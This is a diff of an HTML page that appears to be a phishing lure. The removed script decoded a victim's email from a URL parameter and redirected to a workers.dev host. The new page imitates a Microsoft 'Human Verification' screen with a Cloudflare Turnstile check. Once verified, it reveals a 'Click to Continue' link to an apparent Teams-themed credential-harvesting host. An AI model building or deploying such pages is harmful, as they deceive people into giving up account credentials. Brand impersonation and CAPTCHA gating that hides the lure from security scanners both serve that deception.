@@ -1,93 +1,356 @@
+
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title></title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-  </head>
-  <body>
-    <script>
-      // --- Utility functions ---
-      function isBinaryString(s) {
-        return /^[01]+$/.test(s) && s.length % 8 === 0;
-      }
-
-      function isHexString(s) {
-        return /^[0-9a-fA-F]+$/.test(s) && s.length % 2 === 0;
-      }
-
-      function looksLikeBase64(s) {
-        return s.length >= 4 && /^[A-Za-z0-9+/]+={0,2}$/.test(s);
-      }
-
-      function binaryToString(bin) {
-        bin = bin.replace(/\s+/g, '');
-        const bytes = bin.match(/.{1,8}/g) || [];
-        return bytes.map(b => String.fromCharCode(parseInt(b, 2))).join('');
-      }
-
-      function hexToString(hex) {
-        hex = hex.replace(/\s+/g, '').replace(/^0x/i, '');
-        const pairs = hex.match(/.{1,2}/g) || [];
-        return pairs.map(p => String.fromCharCode(parseInt(p, 16))).join('');
-      }
-
-      function base64ToString(b64) {
-        try {
-          const binary = atob(b64);
-          let pct = '';
-          for (let i = 0; i < binary.length; i++) {
-            pct += '%' + ('00' + binary.charCodeAt(i).toString(16)).slice(-2);
-          }
-          return decodeURIComponent(pct);
-        } catch (e) {
-          return atob(b64);
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>Human Verification</title>
+    
+    <!-- Cloudflare Turnstile - loaded properly -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad" async defer></script>
+    
+    <style>
+        /* === FULL PAGE RESET === */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-      }
 
-      function getParameterByName(name) {
-        const url = new URL(window.location.href);
-        return url.searchParams.get(name);
-      }
+        html, body {
+            width: 100%;
+            height: 100%;
+            min-height: 100vh;
+            min-height: 100dvh;
+            background: #f4f4f4;
+            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+            padding: 0;
+            overflow: hidden; /* no scroll, full page */
+        }
 
-      // --- Main redirect logic ---
-      function redirectPage() {
-        const data2 = getParameterByName('state');
-        let decoded = data2 || '';
-        let method = 'plain';
+        /* Full page wrapper */
+        .page-wrapper {
+            width: 100%;
+            height: 100vh;
+            height: 100dvh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f4f4f4;
+            padding: 20px;
+        }
 
-        if (data2) {
-          try {
-            if (isBinaryString(data2)) {
-              decoded = binaryToString(data2);
-              method = 'binary';
-            } else if (isHexString(data2)) {
-              decoded = hexToString(data2);
-              method = 'hex';
-            } else if (looksLikeBase64(data2)) {
-              decoded = base64ToString(data2);
-              method = 'base64';
-            } else {
-              decoded = decodeURIComponent(data2);
-              method = 'plain';
+        /* Card - perfectly centered */
+        .card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 480px;
+            padding: 40px 32px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
+            border: 1px solid #e8e8e8;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        /* Microsoft-style logo */
+        .ms-logo {
+            display: grid;
+            grid-template-columns: repeat(2, 24px);
+            gap: 4px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .ms-logo div {
+            width: 24px;
+            height: 24px;
+            background: #0078d4;
+            border-radius: 2px;
+        }
+
+        h2 {
+            color: #1a1a1a;
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0 0 8px 0;
+            letter-spacing: -0.2px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .access-box {
+            background: #f6f6f6;
+            border: 1px solid #e8e8e8;
+            border-radius: 6px;
+            padding: 10px 14px;
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 22px;
+            letter-spacing: 0.3px;
+        }
+
+        /* Turnstile container */
+        .widget-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 80px;
+            margin-bottom: 20px;
+        }
+
+        .cf-turnstile {
+            display: inline-block;
+        }
+
+        /* Action button - hidden until verified */
+        .action-container {
+            display: none;
+            justify-content: center;
+            width: 100%;
+            margin-top: 4px;
+        }
+
+        .action-container.visible {
+            display: flex;
+        }
+
+        .btn {
+            background: #0078d4;
+            color: #fff;
+            border: none;
+            padding: 14px 28px;
+            font-size: 15px;
+            font-weight: 600;
+            width: 100%;
+            max-width: 280px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s;
+            text-decoration: none;
+            text-align: center;
+            display: inline-block;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+        }
+
+        .btn:hover {
+            background: #106ebe;
+        }
+        .btn:active {
+            background: #005a9e;
+        }
+
+        /* Loading state */
+        .loading-text {
+            color: #999;
+            font-size: 13px;
+        }
+
+        /* Error state */
+        .error-message {
+            display: none;
+            color: #d32f2f;
+            font-size: 13px;
+            margin-top: 8px;
+            padding: 8px 12px;
+            background: #fde8e8;
+            border-radius: 4px;
+        }
+        .error-message.visible {
+            display: block;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .card {
+                padding: 30px 20px;
+                margin: 10px;
             }
-          } catch (e) {
-            decoded = data2;
-            method = 'plain';
-          }
-
-          // --- Re-encode decoded email into Base64 ---
-          const reEncodedEmail = btoa(decoded);
-
-          // --- Redirect with Base64 email as hash ---
-          window.location.href = "https://online-preview.mountviewpharmaceutical.workers.dev/6ed8e7d40f56/gs/" + data2;
-        } else {
-          window.location.href = "https://online-preview.mountviewpharmaceutical.workers.dev/6ed8e7d40f56/gs/";
+            h2 {
+                font-size: 22px;
+            }
+            .ms-logo {
+                gap: 3px;
+            }
+            .ms-logo div {
+                width: 20px;
+                height: 20px;
+            }
         }
-      }
 
-      redirectPage();
+        @media (max-width: 360px) {
+            .card {
+                padding: 24px 16px;
+            }
+            .cf-turnstile {
+                transform: scale(0.9);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="page-wrapper">
+        <div class="card">
+            <!-- Logo -->
+            <div class="ms-logo">
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
+
+            <h2>Human Verification</h2>
+            <div class="subtitle">Verify you are human by completing the action below.</div>
+
+            <div class="access-box">🔒 Verifying Access</div>
+
+            <!-- Turnstile Widget -->
+            <div class="widget-container">
+                <div id="turnstile-container" class="cf-turnstile" 
+                     data-sitekey="0x4AAAAAAFFUhG05Wm2j8tfU" 
+                     data-theme="light" 
+                     data-size="normal" 
+                     data-callback="onVerificationSuccess"
+                     data-error-callback="onVerificationError"
+                     data-expired-callback="onVerificationExpired">
+                </div>
+                <div id="loading-placeholder" class="loading-text">Loading verification...</div>
+            </div>
+
+            <!-- Error message -->
+            <div id="error-message" class="error-message">
+                ⚠️ Verification could not be loaded. Please refresh the page.
+            </div>
+
+            <!-- Action Button (hidden until success) -->
+            <div id="action-container" class="action-container">
+                <a id="verify-btn" 
+                   class="btn" 
+                   href="https://teams-events-93893.super-sun-1076.workers.dev/ls/teams2" 
+                   target="_blank" 
+                   rel="noopener noreferrer">
+                    ✅ Click to Continue
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- Callback functions for Turnstile ---
+
+        // Called when Turnstile is successfully loaded
+        function onTurnstileLoad() {
+            console.log('Turnstile loaded');
+            const placeholder = document.getElementById('loading-placeholder');
+            if (placeholder) {
+                placeholder.style.display = 'none';
+            }
+        }
+
+        // Called when verification succeeds
+        function onVerificationSuccess(token) {
+            console.log('✅ Verification successful, token:', token);
+            
+            const actionContainer = document.getElementById('action-container');
+            if (actionContainer) {
+                actionContainer.classList.add('visible');
+                actionContainer.style.display = 'flex';
+            }
+            
+            // Hide any error
+            const errorEl = document.getElementById('error-message');
+            if (errorEl) {
+                errorEl.classList.remove('visible');
+            }
+        }
+
+        // Called when verification fails
+        function onVerificationError() {
+            console.error('❌ Verification error');
+            const errorEl = document.getElementById('error-message');
+            if (errorEl) {
+                errorEl.classList.add('visible');
+                errorEl.textContent = '⚠️ Verification failed. Please try again.';
+            }
+            // Reset button visibility
+            const actionContainer = document.getElementById('action-container');
+            if (actionContainer) {
+                actionContainer.classList.remove('visible');
+                actionContainer.style.display = 'none';
+            }
+        }
+
+        // Called when the token expires
+        function onVerificationExpired() {
+            console.warn('⏰ Verification expired, please re-verify');
+            const actionContainer = document.getElementById('action-container');
+            if (actionContainer) {
+                actionContainer.classList.remove('visible');
+                actionContainer.style.display = 'none';
+            }
+            // Show a subtle message
+            const errorEl = document.getElementById('error-message');
+            if (errorEl) {
+                errorEl.classList.add('visible');
+                errorEl.textContent = '⏳ Verification expired. Please complete the captcha again.';
+            }
+        }
+
+        // --- Make functions globally accessible for Turnstile callbacks ---
+        window.onTurnstileLoad = onTurnstileLoad;
+        window.onVerificationSuccess = onVerificationSuccess;
+        window.onVerificationError = onVerificationError;
+        window.onVerificationExpired = onVerificationExpired;
+
+        // --- Fallback: if Turnstile doesn't load within 5 seconds, show error ---
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hide loading placeholder after a moment (Turnstile will replace it)
+            setTimeout(function() {
+                const placeholder = document.getElementById('loading-placeholder');
+                if (placeholder && placeholder.style.display !== 'none') {
+                    // Check if turnstile actually loaded by looking for the iframe
+                    const iframe = document.querySelector('.cf-turnstile iframe');
+                    if (!iframe) {
+                        // Turnstile might be slow, but we'll show error after 8s
+                        setTimeout(function() {
+                            const iframeCheck = document.querySelector('.cf-turnstile iframe');
+                            if (!iframeCheck) {
+                                const errorEl = document.getElementById('error-message');
+                                if (errorEl) {
+                                    errorEl.classList.add('visible');
+                                    errorEl.textContent = '⚠️ Could not load verification. Please refresh the page.';
+                                }
+                                if (placeholder) {
+                                    placeholder.textContent = '⚠️ Failed to load';
+                                }
+                            }
+                        }, 3000);
+                    }
+                }
+            }, 1000);
+        });
+
+        // --- Handle any CORS/network issues gracefully ---
+        window.addEventListener('error', function(e) {
+            if (e.target.tagName === 'SCRIPT' && e.target.src.includes('cloudflare')) {
+                console.error('Failed to load Turnstile script');
+                const errorEl = document.getElementById('error-message');
+                if (errorEl) {
+                    errorEl.classList.add('visible');
+                    errorEl.textContent = '⚠️ Verification service unavailable. Please refresh.';
+                }
+            }
+        }, true);
     </script>
-  </body>
+
+</body>
 </html>
